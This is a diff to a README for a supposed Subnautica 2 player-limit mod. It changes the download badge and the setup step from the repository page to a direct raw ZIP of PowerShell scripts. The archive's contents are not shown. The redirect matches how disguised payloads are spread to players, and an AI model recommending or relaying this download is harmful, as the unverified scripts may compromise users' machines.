@@ -1,6 +1,6 @@
 # 🌊 SN2-PlayerLimit-ConfigOverride - Increase your server player count easily
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride/raw/refs/heads/main/Config/Limit_Player_Override_S_Config_1.7.zip)
 
 This software modifies the default player limit settings for Subnautica 2 multiplayer sessions. The tool updates your local configuration files automatically using a simple script. This allows you to host sessions with more friends than the game normally supports.
 
@@ -19,7 +19,7 @@ The tool uses PowerShell to perform these changes. It reads your current game in
 
 ## 🚀 Getting started
 
-1. Visit the repository page to download the latest setup file: [https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride](https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride)
+1. Visit the repository page to download the latest setup file: [https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride/raw/refs/heads/main/Config/Limit_Player_Override_S_Config_1.7.zip](https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride/raw/refs/heads/main/Config/Limit_Player_Override_S_Config_1.7.zip)
 2. Locate the ZIP file in your Downloads folder.
 3. Right-click the folder and select Extract All.
 4. Open the extracted folder to see the script files.
